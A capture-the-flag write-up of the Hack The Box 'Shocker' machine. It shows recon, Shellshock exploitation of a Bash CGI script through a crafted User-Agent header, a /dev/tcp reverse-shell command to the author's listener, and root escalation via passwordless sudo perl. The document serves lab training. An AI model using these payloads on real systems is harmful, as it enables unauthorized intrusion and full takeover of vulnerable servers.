# HTB_Shocker


This is my write-up for the Shocker machine on Hack The Box. I exploited a Shellshock vulnerability in a Bash CGI script to gain initial access, then escalated to root using a simple sudo misconfiguration.

---

## Recon

### Nmap
I started with a full port scan:

```bash
nmap -A -Pn -p- -T4 10.129.163.43
````

![Nmap Scan](https://raw.githubusercontent.com/ibrahimAlbadrani/HTB_Shocker/refs/heads/main/Nmap1.png)


**Open ports:**

- `80/tcp` – Apache httpd 2.4.18
    
- `2222/tcp` – OpenSSH 7.2p2
    

The rest were filtered.

### Web Checks

- `whatweb` confirmed Apache 2.4.18
    
- Edited `/etc/hosts` to include:
    
    ```
    10.129.163.43 shocker.htb
    ```
    

---

## Web Enumeration

I ran both `dirsearch` and `gobuster` to find hidden paths.

```bash
gobuster dir -u http://shocker.htb -w /usr/share/wordlists/dirb/common.txt
```

That revealed `/cgi-bin/`.

Then I focused on that path with extensions:

```bash
gobuster dir -u http://shocker.htb/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,pl,cgi
```

Found:

```
/cgi-bin/user.sh
```

When I accessed it, it returned basic uptime output — a Bash CGI script.

---

## Exploitation – Shellshock (CVE-2014-6271)

I tested Shellshock with:

```bash
curl -H "User-Agent: () { :; }; echo; /bin/id" http://shocker.htb/cgi-bin/user.sh
```

It responded with the UID of `www-data`. So it was vulnerable.

### Reverse Shell

I set up my listener:

```bash
nc -lvnp 4444
```

Then launched the attack:

```bash
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.71/4444 0>&1'" http://shocker.htb/cgi-bin/user.sh
```

Got a shell as user `shelly`.

---

## Privilege Escalation

First, I checked for sudo rights:

```bash
sudo -l
```

Output:

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

That means I could run Perl as root with no password.

### Root Shell

I used:

```bash
sudo perl -e 'exec "/bin/bash";'
```

Confirmed with `whoami` — I was root.

---

## Flags

- `user.txt`: Found in `/home/shelly/
    
- `root.txt`: Found in `/root/root.txt

---

## Notes

This machine was a good refresher on CGI-Bash vulnerabilities and the Shellshock CVE. I avoided using Metasploit or automated exploits — everything was done manually to improve my process understanding.

---

**Written by:** Ibrahim Ismaeel  
[GitHub Profile](https://github.com/IbrahimAlbadrani)
